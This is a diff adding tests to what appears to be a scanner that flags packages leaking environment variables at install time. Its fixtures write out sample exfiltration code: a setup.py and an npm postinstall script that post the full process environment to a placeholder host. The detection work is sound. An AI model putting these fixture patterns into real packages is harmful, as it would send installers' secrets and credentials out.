@@ -397,6 +397,61 @@ def test_copies_of_the_environment_count_only_when_serialised(tmp_path):
     assert lines == [4, 5]  # json.dumps and str; the copies on lines 2 and 3 are quiet
 
 
+def env_lines(report, suffix: str) -> list[int]:
+    return sorted(f.region.line for f in report.findings
+                  if f.rule.id == "BS-ENV-001" and f.path.endswith(suffix))
+
+
+def test_the_environment_held_in_a_value_and_sent_or_serialised(tmp_path):
+    root = build(tmp_path, {
+        "setup.py": (
+            "import json, os, requests\n"
+            "from os import environ\n"
+            "requests.post('https://example.invalid', json={'env': dict(os.environ)})\n"
+            "info = {'host': 'x', 'env': environ}\n"
+            "body = json.dumps(info)\n"
+        ),
+        "package.json": package({"postinstall": "node index.js"}),
+        "index.js": (
+            "const axios = require('axios');\n"
+            "JSON.stringify({ host: 'x', env: process.env });\n"
+            "axios.post('https://example.invalid', { env: { ...process.env } });\n"
+            "const info = { env: process.env };\n"
+            "fetch('https://example.invalid', { method: 'POST', body: info });\n"
+            "const copy = process.env;\n"
+            "fetch('https://example.invalid', { body: [copy] });\n"
+        ),
+    })
+    report = scan([root])
+    assert env_lines(report, "setup.py") == [3, 5]
+    assert env_lines(report, "index.js") == [2, 3, 5, 7]
+    # The correlation is reported at each entry point: setup.py, and the npm hook.
+    assert {"BS-EX-001"} <= ids_at(report, "setup.py") & ids_at(report, "package.json")
+
+
+def test_the_environment_given_to_a_child_process_stays_quiet(tmp_path):
+    root = build(tmp_path, {
+        "setup.py": (
+            "import os, subprocess, requests\n"
+            "options = {'env': dict(os.environ, CC='gcc')}\n"
+            "subprocess.run(['make'], **options)\n"
+            "subprocess.run(['make'], env={**os.environ, 'CC': 'gcc'})\n"
+            "requests.get('https://example.invalid', params={'v': os.environ.get('HOME')})\n"
+        ),
+        "package.json": package({"postinstall": "node build.js"}),
+        "build.js": (
+            "const { spawn } = require('child_process');\n"
+            "const options = { env: { ...process.env, CC: 'gcc' }, stdio: 'inherit' };\n"
+            "spawn('make', [], options);\n"
+            "spawn('make', [], { env: process.env });\n"
+            "fetch('https://example.invalid', { headers: { 'x-home': process.env.HOME } });\n"
+            "fetch('https://example.invalid', { body: JSON.stringify({ env: 'production' }) });\n"
+        ),
+    })
+    report = scan([root])
+    assert env_lines(report, "setup.py") == [] and env_lines(report, "build.js") == []
+
+
 def test_conftest_with_code_hidden_after_whitespace(tmp_path):
     hidden = "def test_ok():\n    assert True" + " " * 150 + "; import os\n"
     root = build(tmp_path, {"tests/conftest.py": hidden})
